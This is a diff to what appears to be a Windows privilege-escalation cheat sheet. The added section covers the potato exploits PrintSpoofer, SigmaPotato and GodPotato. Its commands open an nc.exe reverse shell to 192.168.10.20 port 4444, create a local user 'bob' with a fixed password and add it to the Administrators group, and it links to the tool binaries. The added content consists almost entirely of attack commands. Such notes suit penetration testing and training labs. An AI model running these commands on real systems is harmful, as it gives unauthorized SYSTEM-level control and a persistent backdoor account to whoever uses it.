@@ -112,8 +112,30 @@ sc start <service_name>
 ```powershell
 PrintSpoofer64.exe -i -c cmd
 ```
+``` powershell
+.\PrintSpoofer64.exe -c "C:\Users\bob\Desktop\nc.exe 192.168.10.20 4444 -e cmd"
+```
+- https://github.com/int0x33/nc.exe/
 - https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
+```powershell
+.\SigmaPotato "net user bob password@123 /add"
+```
+```powershell
+.\SigmaPotato "net localgroup Administrators bob /add"
+```
+- https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+
+```powershell
+.\GodPotato-NET4.EXE -cmd "C:\Temp\nc.exe 192.168.10.20 4444 -e cmd"
+```
+```powershell
+.\GodPotato-NET35.EXE -cmd "C:\Temp\nc.exe 192.168.10.20 4444 -e cmd"
+```
+- https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+- https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
+
+  
 ### Autorun
 -> Detection - windows
 ```powershell
